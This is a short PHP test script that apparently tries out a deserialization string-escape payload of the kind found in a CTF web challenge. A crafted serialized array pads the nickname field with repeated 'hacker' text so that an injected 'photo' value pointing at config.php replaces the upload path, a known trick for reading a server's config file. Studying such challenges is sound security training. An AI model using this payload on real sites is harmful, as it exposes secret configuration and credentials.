<?php


$str="rXEx+W357zGu65wbGFuKNfuusO4z9Taufm2sLHP0rXWrsewzeqzyW9yIMq1z9awySkNCmNhc2NvINDeuMRidWcNCtHusv2y/bXEYW5kcm9pZA0KDQoNCg0KDQoNCjBjdGajug0Kvs3O0sO71/az9tK7tcDM4iyy7r7gsKHJ7snutcTUrdLyoaO/tMflz9bXtKOsusO6w8WswaY=";
//echo  base64_decode($str);



$str2='a:4:{s:5:"phone";s:11:"13761863519";s:5:"email";s:18:"crontab123@163.com";s:8:"nickname";a:1:{i:0;s:186:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/c9518b676a63638382a9f27ab7220508";}';

var_dump(unserialize($str2));



$str3='a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}';

var_dump(unserialize($str3));
?>